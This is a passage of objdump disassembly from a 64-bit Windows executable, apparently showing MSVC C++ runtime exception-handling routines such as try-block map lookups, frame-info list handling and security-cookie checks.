   14000418b:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000418f:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140004193:	ff 15 47 bf 00 00    	call   *0xbf47(%rip)        # 0x1400100e0
   140004199:	ff 0d 69 ab 01 00    	decl   0x1ab69(%rip)        # 0x14001ed08
   14000419f:	85 db                	test   %ebx,%ebx
   1400041a1:	75 df                	jne    0x140004182
   1400041a3:	b0 01                	mov    $0x1,%al
   1400041a5:	48 83 c4 20          	add    $0x20,%rsp
   1400041a9:	5b                   	pop    %rbx
   1400041aa:	c3                   	ret
   1400041ab:	cc                   	int3
   1400041ac:	48 8b c4             	mov    %rsp,%rax
   1400041af:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400041b3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400041b7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400041bb:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400041bf:	53                   	push   %rbx
   1400041c0:	48 83 ec 60          	sub    $0x60,%rsp
   1400041c4:	48 8b d9             	mov    %rcx,%rbx
   1400041c7:	c7 40 d8 00 00 00 00 	movl   $0x0,-0x28(%rax)
   1400041ce:	48 89 48 e8          	mov    %rcx,-0x18(%rax)
   1400041d2:	4c 89 40 f0          	mov    %r8,-0x10(%rax)
   1400041d6:	e8 01 fe ff ff       	call   0x140003fdc
   1400041db:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400041e0:	8b 0b                	mov    (%rbx),%ecx
   1400041e2:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400041e6:	ff 15 a4 c0 00 00    	call   *0xc0a4(%rip)        # 0x140010290
   1400041ec:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1400041f3:	00 
   1400041f4:	eb 00                	jmp    0x1400041f6
   1400041f6:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1400041fa:	48 83 c4 60          	add    $0x60,%rsp
   1400041fe:	5b                   	pop    %rbx
   1400041ff:	c3                   	ret
   140004200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004205:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000420a:	57                   	push   %rdi
   14000420b:	48 83 ec 20          	sub    $0x20,%rsp
   14000420f:	8b 59 0c             	mov    0xc(%rcx),%ebx
   140004212:	8b fa                	mov    %edx,%edi
   140004214:	48 8b f1             	mov    %rcx,%rsi
   140004217:	eb 24                	jmp    0x14000423d
   140004219:	ff cb                	dec    %ebx
   14000421b:	e8 bc fd ff ff       	call   0x140003fdc
   140004220:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140004224:	48 8b 40 60          	mov    0x60(%rax),%rax
   140004228:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000422c:	48 63 46 10          	movslq 0x10(%rsi),%rax
   140004230:	48 03 c1             	add    %rcx,%rax
   140004233:	3b 78 04             	cmp    0x4(%rax),%edi
   140004236:	7e 05                	jle    0x14000423d
   140004238:	3b 78 08             	cmp    0x8(%rax),%edi
   14000423b:	7e 06                	jle    0x140004243
   14000423d:	85 db                	test   %ebx,%ebx
   14000423f:	75 d8                	jne    0x140004219
   140004241:	33 c0                	xor    %eax,%eax
   140004243:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004248:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000424d:	48 83 c4 20          	add    $0x20,%rsp
   140004251:	5f                   	pop    %rdi
   140004252:	c3                   	ret
   140004253:	cc                   	int3
   140004254:	40 53                	rex push %rbx
   140004256:	48 83 ec 20          	sub    $0x20,%rsp
   14000425a:	48 8b da             	mov    %rdx,%rbx
   14000425d:	48 8b d1             	mov    %rcx,%rdx
   140004260:	48 8b cb             	mov    %rbx,%rcx
   140004263:	e8 a8 05 00 00       	call   0x140004810
   140004268:	8b d0                	mov    %eax,%edx
   14000426a:	48 8b cb             	mov    %rbx,%rcx
   14000426d:	e8 8e ff ff ff       	call   0x140004200
   140004272:	48 85 c0             	test   %rax,%rax
   140004275:	0f 95 c0             	setne  %al
   140004278:	48 83 c4 20          	add    $0x20,%rsp
   14000427c:	5b                   	pop    %rbx
   14000427d:	c3                   	ret
   14000427e:	cc                   	int3
   14000427f:	cc                   	int3
   140004280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004285:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000428a:	57                   	push   %rdi
   14000428b:	48 83 ec 20          	sub    $0x20,%rsp
   14000428f:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140004294:	49 8b d8             	mov    %r8,%rbx
   140004297:	48 8b fa             	mov    %rdx,%rdi
   14000429a:	e8 45 00 00 00       	call   0x1400042e4
   14000429f:	48 8b d7             	mov    %rdi,%rdx
   1400042a2:	48 8b cb             	mov    %rbx,%rcx
   1400042a5:	48 8b f0             	mov    %rax,%rsi
   1400042a8:	e8 63 05 00 00       	call   0x140004810
   1400042ad:	8b d0                	mov    %eax,%edx
   1400042af:	48 8b cb             	mov    %rbx,%rcx
   1400042b2:	e8 49 ff ff ff       	call   0x140004200
   1400042b7:	48 85 c0             	test   %rax,%rax
   1400042ba:	75 06                	jne    0x1400042c2
   1400042bc:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400042c0:	eb 04                	jmp    0x1400042c6
   1400042c2:	44 8b 48 04          	mov    0x4(%rax),%r9d
   1400042c6:	4c 8b c3             	mov    %rbx,%r8
   1400042c9:	48 8b d7             	mov    %rdi,%rdx
   1400042cc:	48 8b ce             	mov    %rsi,%rcx
   1400042cf:	e8 14 17 00 00       	call   0x1400059e8
   1400042d4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400042d9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400042de:	48 83 c4 20          	add    $0x20,%rsp
   1400042e2:	5f                   	pop    %rdi
   1400042e3:	c3                   	ret
   1400042e4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400042e9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400042ee:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400042f3:	57                   	push   %rdi
   1400042f4:	41 54                	push   %r12
   1400042f6:	41 55                	push   %r13
   1400042f8:	41 56                	push   %r14
   1400042fa:	41 57                	push   %r15
   1400042fc:	48 83 ec 20          	sub    $0x20,%rsp
   140004300:	41 8b 58 0c          	mov    0xc(%r8),%ebx
   140004304:	4c 8b e9             	mov    %rcx,%r13
   140004307:	49 8b c8             	mov    %r8,%rcx
   14000430a:	4d 8b f1             	mov    %r9,%r14
   14000430d:	4d 8b f8             	mov    %r8,%r15
   140004310:	4c 8b e2             	mov    %rdx,%r12
   140004313:	e8 f8 04 00 00       	call   0x140004810
   140004318:	4d 8b 55 00          	mov    0x0(%r13),%r10
   14000431c:	8b e8                	mov    %eax,%ebp
   14000431e:	4d 89 16             	mov    %r10,(%r14)
   140004321:	eb 64                	jmp    0x140004387
   140004323:	49 63 47 10          	movslq 0x10(%r15),%rax
   140004327:	ff cb                	dec    %ebx
   140004329:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
   14000432e:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140004332:	48 8d 3c 90          	lea    (%rax,%rdx,4),%rdi
   140004336:	3b 6c 37 04          	cmp    0x4(%rdi,%rsi,1),%ebp
   14000433a:	7e 4b                	jle    0x140004387
   14000433c:	3b 6c 37 08          	cmp    0x8(%rdi,%rsi,1),%ebp
   140004340:	7f 45                	jg     0x140004387
   140004342:	49 8b 0c 24          	mov    (%r12),%rcx
   140004346:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000434b:	45 33 c0             	xor    %r8d,%r8d
   14000434e:	ff 15 94 bd 00 00    	call   *0xbd94(%rip)        # 0x1400100e8
   140004354:	4c 63 4c 37 10       	movslq 0x10(%rdi,%rsi,1),%r9
   140004359:	33 d2                	xor    %edx,%edx
   14000435b:	4c 03 4c 24 50       	add    0x50(%rsp),%r9
   140004360:	44 8b 44 37 0c       	mov    0xc(%rdi,%rsi,1),%r8d
   140004365:	44 8b 10             	mov    (%rax),%r10d
   140004368:	45 85 c0             	test   %r8d,%r8d
   14000436b:	74 15                	je     0x140004382
   14000436d:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140004371:	49 63 44 89 0c       	movslq 0xc(%r9,%rcx,4),%rax
   140004376:	49 3b c2             	cmp    %r10,%rax
   140004379:	74 12                	je     0x14000438d
   14000437b:	ff c2                	inc    %edx
   14000437d:	41 3b d0             	cmp    %r8d,%edx
   140004380:	72 eb                	jb     0x14000436d
   140004382:	41 3b d0             	cmp    %r8d,%edx
   140004385:	72 06                	jb     0x14000438d
   140004387:	85 db                	test   %ebx,%ebx
   140004389:	75 98                	jne    0x140004323
   14000438b:	eb 14                	jmp    0x1400043a1
   14000438d:	49 8b 45 00          	mov    0x0(%r13),%rax
   140004391:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140004395:	49 63 4c 89 10       	movslq 0x10(%r9,%rcx,4),%rcx
   14000439a:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   14000439e:	49 89 0e             	mov    %rcx,(%r14)
   1400043a1:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400043a6:	49 8b c6             	mov    %r14,%rax
   1400043a9:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400043ae:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400043b3:	48 83 c4 20          	add    $0x20,%rsp
   1400043b7:	41 5f                	pop    %r15
   1400043b9:	41 5e                	pop    %r14
   1400043bb:	41 5d                	pop    %r13
   1400043bd:	41 5c                	pop    %r12
   1400043bf:	5f                   	pop    %rdi
   1400043c0:	c3                   	ret
   1400043c1:	cc                   	int3
   1400043c2:	cc                   	int3
   1400043c3:	cc                   	int3
   1400043c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400043c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400043ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400043d3:	57                   	push   %rdi
   1400043d4:	41 54                	push   %r12
   1400043d6:	41 55                	push   %r13
   1400043d8:	41 56                	push   %r14
   1400043da:	41 57                	push   %r15
   1400043dc:	48 83 ec 30          	sub    $0x30,%rsp
   1400043e0:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400043e7:	00 
   1400043e8:	4c 8b e2             	mov    %rdx,%r12
   1400043eb:	48 8b f9             	mov    %rcx,%rdi
   1400043ee:	49 8b d1             	mov    %r9,%rdx
   1400043f1:	48 8b cb             	mov    %rbx,%rcx
   1400043f4:	49 8b f1             	mov    %r9,%rsi
   1400043f7:	45 8b f8             	mov    %r8d,%r15d
   1400043fa:	44 8b 73 0c          	mov    0xc(%rbx),%r14d
   1400043fe:	e8 0d 04 00 00       	call   0x140004810
   140004403:	45 33 d2             	xor    %r10d,%r10d
   140004406:	8b e8                	mov    %eax,%ebp
   140004408:	45 85 f6             	test   %r14d,%r14d
   14000440b:	0f 84 e7 00 00 00    	je     0x1400044f8
   140004411:	48 8b 76 08          	mov    0x8(%rsi),%rsi
   140004415:	83 c8 ff             	or     $0xffffffff,%eax
   140004418:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   14000441c:	44 8b c0             	mov    %eax,%r8d
   14000441f:	44 8b e8             	mov    %eax,%r13d
   140004422:	41 8b ce             	mov    %r14d,%ecx
   140004425:	4c 8d 1c 1e          	lea    (%rsi,%rbx,1),%r11
   140004429:	44 8d 49 ff          	lea    -0x1(%rcx),%r9d
   14000442d:	4b 8d 14 89          	lea    (%r9,%r9,4),%rdx
   140004431:	48 8d 04 96          	lea    (%rsi,%rdx,4),%rax
   140004435:	3b 6c 18 04          	cmp    0x4(%rax,%rbx,1),%ebp
   140004439:	7e 0b                	jle    0x140004446
   14000443b:	41 3b 6c 93 08       	cmp    0x8(%r11,%rdx,4),%ebp
   140004440:	0f 8e 9f 00 00 00    	jle    0x1400044e5
   140004446:	41 8b c9             	mov    %r9d,%ecx
   140004449:	45 85 c9             	test   %r9d,%r9d
   14000444c:	75 db                	jne    0x140004429
   14000444e:	49 8b d2             	mov    %r10,%rdx
   140004451:	41 8b ca             	mov    %r10d,%ecx
   140004454:	83 cb ff             	or     $0xffffffff,%ebx
   140004457:	8b c1                	mov    %ecx,%eax
   140004459:	4c 8d 0c 80          	lea    (%rax,%rax,4),%r9
   14000445d:	48 85 d2             	test   %rdx,%rdx
   140004460:	74 13                	je     0x140004475
   140004462:	8b 42 04             	mov    0x4(%rdx),%eax
   140004465:	43 39 04 8b          	cmp    %eax,(%r11,%r9,4)
   140004469:	7e 21                	jle    0x14000448c
   14000446b:	8b 42 08             	mov    0x8(%rdx),%eax
   14000446e:	43 39 44 8b 04       	cmp    %eax,0x4(%r11,%r9,4)
   140004473:	7f 17                	jg     0x14000448c
   140004475:	47 3b 3c 8b          	cmp    (%r11,%r9,4),%r15d
   140004479:	7c 11                	jl     0x14000448c
   14000447b:	47 3b 7c 8b 04       	cmp    0x4(%r11,%r9,4),%r15d
   140004480:	7f 0a                	jg     0x14000448c
   140004482:	44 3b c3             	cmp    %ebx,%r8d
   140004485:	44 8b e9             	mov    %ecx,%r13d
   140004488:	44 0f 44 c1          	cmove  %ecx,%r8d
   14000448c:	ff c1                	inc    %ecx
   14000448e:	41 3b ce             	cmp    %r14d,%ecx
   140004491:	72 c4                	jb     0x140004457
   140004493:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140004498:	41 8d 45 01          	lea    0x1(%r13),%eax
   14000449c:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400044a1:	44 3b c3             	cmp    %ebx,%r8d
   1400044a4:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400044a9:	41 8b ca             	mov    %r10d,%ecx
   1400044ac:	0f 45 c8             	cmovne %eax,%ecx
   1400044af:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400044b4:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1400044b8:	45 0f 45 d0          	cmovne %r8d,%r10d
   1400044bc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400044c0:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   1400044c5:	89 47 0c             	mov    %eax,0xc(%rdi)
   1400044c8:	48 8b c7             	mov    %rdi,%rax
   1400044cb:	4c 89 27             	mov    %r12,(%rdi)
   1400044ce:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%rdi)
   1400044d3:	44 89 57 08          	mov    %r10d,0x8(%rdi)
   1400044d7:	48 83 c4 30          	add    $0x30,%rsp
   1400044db:	41 5f                	pop    %r15
   1400044dd:	41 5e                	pop    %r14
   1400044df:	41 5d                	pop    %r13
   1400044e1:	41 5c                	pop    %r12
   1400044e3:	5f                   	pop    %rdi
   1400044e4:	c3                   	ret
   1400044e5:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1400044e8:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400044ec:	48 8d 14 86          	lea    (%rsi,%rax,4),%rdx
   1400044f0:	48 03 d3             	add    %rbx,%rdx
   1400044f3:	e9 59 ff ff ff       	jmp    0x140004451
   1400044f8:	e8 f3 2d 00 00       	call   0x1400072f0
   1400044fd:	cc                   	int3
   1400044fe:	cc                   	int3
   1400044ff:	cc                   	int3
   140004500:	40 55                	rex push %rbp
   140004502:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140004507:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000450e:	48 8b 05 eb 9a 01 00 	mov    0x19aeb(%rip),%rax        # 0x14001e000
   140004515:	48 33 c4             	xor    %rsp,%rax
   140004518:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   14000451c:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   140004520:	48 8d 05 c9 d6 00 00 	lea    0xd6c9(%rip),%rax        # 0x140011bf0
   140004527:	0f 10 00             	movups (%rax),%xmm0
   14000452a:	4c 8b d9             	mov    %rcx,%r11
   14000452d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004532:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004536:	0f 11 01             	movups %xmm0,(%rcx)
   140004539:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   14000453d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140004541:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140004545:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140004549:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000454d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140004551:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140004555:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140004559:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000455d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140004561:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   140004568:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   14000456c:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   140004570:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   140004577:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   14000457b:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   140004582:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   140004589:	48 8d 05 c4 11 00 00 	lea    0x11c4(%rip),%rax        # 0x140005754
   140004590:	49 8b 0b             	mov    (%r11),%rcx
   140004593:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   140004597:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   14000459b:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   14000459f:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   1400045a3:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   1400045a7:	48 8b 45 57          	mov    0x57(%rbp),%rax
   1400045ab:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400045af:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   1400045b3:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400045b7:	49 8b 42 40          	mov    0x40(%r10),%rax
   1400045bb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400045c0:	49 8b 42 28          	mov    0x28(%r10),%rax
   1400045c4:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   1400045c8:	45 33 c9             	xor    %r9d,%r9d
   1400045cb:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   1400045cf:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400045d4:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   1400045d8:	49 8b 12             	mov    (%r10),%rdx
   1400045db:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400045e0:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   1400045e7:	19 
   1400045e8:	ff 15 a2 ba 00 00    	call   *0xbaa2(%rip)        # 0x140010090
   1400045ee:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   1400045f2:	48 33 cc             	xor    %rsp,%rcx
   1400045f5:	e8 16 eb ff ff       	call   0x140003110
   1400045fa:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   140004601:	5d                   	pop    %rbp
   140004602:	c3                   	ret
   140004603:	cc                   	int3
   140004604:	40 53                	rex push %rbx
   140004606:	48 83 ec 20          	sub    $0x20,%rsp
   14000460a:	48 8b d9             	mov    %rcx,%rbx
   14000460d:	48 89 11             	mov    %rdx,(%rcx)
   140004610:	e8 c7 f9 ff ff       	call   0x140003fdc
   140004615:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140004619:	73 0b                	jae    0x140004626
   14000461b:	e8 bc f9 ff ff       	call   0x140003fdc
   140004620:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140004624:	eb 02                	jmp    0x140004628
   140004626:	33 c9                	xor    %ecx,%ecx
   140004628:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000462c:	e8 ab f9 ff ff       	call   0x140003fdc
   140004631:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140004635:	48 8b c3             	mov    %rbx,%rax
   140004638:	48 83 c4 20          	add    $0x20,%rsp
   14000463c:	5b                   	pop    %rbx
   14000463d:	c3                   	ret
   14000463e:	cc                   	int3
   14000463f:	cc                   	int3
   140004640:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004645:	57                   	push   %rdi
   140004646:	48 83 ec 20          	sub    $0x20,%rsp
   14000464a:	48 8b f9             	mov    %rcx,%rdi
   14000464d:	e8 8a f9 ff ff       	call   0x140003fdc
   140004652:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   140004656:	75 35                	jne    0x14000468d
   140004658:	e8 7f f9 ff ff       	call   0x140003fdc
   14000465d:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140004661:	48 85 d2             	test   %rdx,%rdx
   140004664:	74 27                	je     0x14000468d
   140004666:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   14000466a:	48 3b fa             	cmp    %rdx,%rdi
   14000466d:	74 0a                	je     0x140004679
   14000466f:	48 8b d3             	mov    %rbx,%rdx
   140004672:	48 85 db             	test   %rbx,%rbx
   140004675:	74 16                	je     0x14000468d
   140004677:	eb ed                	jmp    0x140004666
   140004679:	e8 5e f9 ff ff       	call   0x140003fdc
   14000467e:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140004682:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004687:	48 83 c4 20          	add    $0x20,%rsp
   14000468b:	5f                   	pop    %rdi
   14000468c:	c3                   	ret
   14000468d:	e8 5e 2c 00 00       	call   0x1400072f0
   140004692:	cc                   	int3
   140004693:	cc                   	int3
   140004694:	48 83 ec 28          	sub    $0x28,%rsp
   140004698:	e8 3f f9 ff ff       	call   0x140003fdc
   14000469d:	48 8b 40 60          	mov    0x60(%rax),%rax
   1400046a1:	48 83 c4 28          	add    $0x28,%rsp
   1400046a5:	c3                   	ret
   1400046a6:	cc                   	int3
   1400046a7:	cc                   	int3
   1400046a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400046ac:	e8 2b f9 ff ff       	call   0x140003fdc
   1400046b1:	48 8b 40 68          	mov    0x68(%rax),%rax
   1400046b5:	48 83 c4 28          	add    $0x28,%rsp
   1400046b9:	c3                   	ret
   1400046ba:	cc                   	int3
   1400046bb:	cc                   	int3
   1400046bc:	40 53                	rex push %rbx
   1400046be:	48 83 ec 20          	sub    $0x20,%rsp
   1400046c2:	48 8b d9             	mov    %rcx,%rbx
   1400046c5:	e8 12 f9 ff ff       	call   0x140003fdc
   1400046ca:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1400046ce:	48 83 c4 20          	add    $0x20,%rsp
   1400046d2:	5b                   	pop    %rbx
   1400046d3:	c3                   	ret
   1400046d4:	40 53                	rex push %rbx
   1400046d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400046da:	48 8b d9             	mov    %rcx,%rbx
   1400046dd:	e8 fa f8 ff ff       	call   0x140003fdc
   1400046e2:	48 89 58 68          	mov    %rbx,0x68(%rax)
   1400046e6:	48 83 c4 20          	add    $0x20,%rsp
   1400046ea:	5b                   	pop    %rbx
   1400046eb:	c3                   	ret
   1400046ec:	48 8b c4             	mov    %rsp,%rax
   1400046ef:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400046f3:	48 89 68 18          	mov    %rbp,0x18(%rax)
   1400046f7:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400046fb:	57                   	push   %rdi
   1400046fc:	48 83 ec 40          	sub    $0x40,%rsp
   140004700:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140004704:	49 8b f9             	mov    %r9,%rdi
   140004707:	49 8b f0             	mov    %r8,%rsi
   14000470a:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000470e:	48 8b e9             	mov    %rcx,%rbp
   140004711:	e8 c6 f8 ff ff       	call   0x140003fdc
   140004716:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000471a:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   14000471e:	e8 b9 f8 ff ff       	call   0x140003fdc
   140004723:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140004727:	e8 b0 f8 ff ff       	call   0x140003fdc
   14000472c:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   140004730:	4c 8b cf             	mov    %rdi,%r9
   140004733:	4c 8b c6             	mov    %rsi,%r8
   140004736:	8b 0a                	mov    (%rdx),%ecx
   140004738:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000473d:	48 03 48 60          	add    0x60(%rax),%rcx
   140004741:	33 c0                	xor    %eax,%eax
   140004743:	88 44 24 38          	mov    %al,0x38(%rsp)
   140004747:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000474c:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140004750:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004755:	48 8b cd             	mov    %rbp,%rcx
   140004758:	e8 03 0f 00 00       	call   0x140005660
   14000475d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140004762:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140004767:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000476c:	48 83 c4 40          	add    $0x40,%rsp
   140004770:	5f                   	pop    %rdi
   140004771:	c3                   	ret
   140004772:	cc                   	int3
   140004773:	cc                   	int3
   140004774:	48 83 ec 28          	sub    $0x28,%rsp
   140004778:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   14000477c:	4d 8b d0             	mov    %r8,%r10
   14000477f:	48 8b 01             	mov    (%rcx),%rax
   140004782:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   140004786:	83 f8 fe             	cmp    $0xfffffffe,%eax
   140004789:	75 0b                	jne    0x140004796
   14000478b:	4c 8b 02             	mov    (%rdx),%r8
   14000478e:	49 8b ca             	mov    %r10,%rcx
   140004791:	e8 82 00 00 00       	call   0x140004818
   140004796:	48 83 c4 28          	add    $0x28,%rsp
   14000479a:	c3                   	ret
   14000479b:	cc                   	int3
   14000479c:	40 53                	rex push %rbx
   14000479e:	48 83 ec 20          	sub    $0x20,%rsp
   1400047a2:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400047a7:	49 8b d8             	mov    %r8,%rbx
   1400047aa:	e8 35 fb ff ff       	call   0x1400042e4
   1400047af:	48 8b 08             	mov    (%rax),%rcx
   1400047b2:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1400047b6:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400047bb:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   1400047bf:	48 83 c4 20          	add    $0x20,%rsp
   1400047c3:	5b                   	pop    %rbx
   1400047c4:	c3                   	ret
   1400047c5:	cc                   	int3
   1400047c6:	cc                   	int3
   1400047c7:	cc                   	int3
   1400047c8:	49 63 50 1c          	movslq 0x1c(%r8),%rdx
   1400047cc:	48 8b 01             	mov    (%rcx),%rax
   1400047cf:	44 89 0c 02          	mov    %r9d,(%rdx,%rax,1)
   1400047d3:	c3                   	ret
   1400047d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400047d9:	57                   	push   %rdi
   1400047da:	48 83 ec 20          	sub    $0x20,%rsp
   1400047de:	41 8b f9             	mov    %r9d,%edi
   1400047e1:	49 8b d8             	mov    %r8,%rbx
   1400047e4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400047e9:	e8 f6 fa ff ff       	call   0x1400042e4
   1400047ee:	48 8b 08             	mov    (%rax),%rcx
   1400047f1:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1400047f5:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400047fa:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   1400047fe:	7e 04                	jle    0x140004804
   140004800:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140004804:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004809:	48 83 c4 20          	add    $0x20,%rsp
   14000480d:	5f                   	pop    %rdi
   14000480e:	c3                   	ret
   14000480f:	cc                   	int3
   140004810:	4c 8b 02             	mov    (%rdx),%r8
   140004813:	e9 00 00 00 00       	jmp    0x140004818
   140004818:	40 53                	rex push %rbx
   14000481a:	48 83 ec 20          	sub    $0x20,%rsp
   14000481e:	48 85 c9             	test   %rcx,%rcx
   140004821:	74 4a                	je     0x14000486d
   140004823:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140004827:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   14000482b:	4b 8d 1c 19          	lea    (%r9,%r11,1),%rbx
   14000482f:	48 85 db             	test   %rbx,%rbx
   140004832:	74 39                	je     0x14000486d
   140004834:	44 8b 51 14          	mov    0x14(%rcx),%r10d
   140004838:	45 85 d2             	test   %r10d,%r10d
   14000483b:	74 2b                	je     0x140004868
   14000483d:	33 d2                	xor    %edx,%edx
   14000483f:	48 63 0c d3          	movslq (%rbx,%rdx,8),%rcx
   140004843:	49 03 c9             	add    %r9,%rcx
   140004846:	4c 3b c1             	cmp    %rcx,%r8
   140004849:	72 07                	jb     0x140004852
   14000484b:	ff c2                	inc    %edx
   14000484d:	41 3b d2             	cmp    %r10d,%edx
   140004850:	72 ed                	jb     0x14000483f
   140004852:	85 d2                	test   %edx,%edx
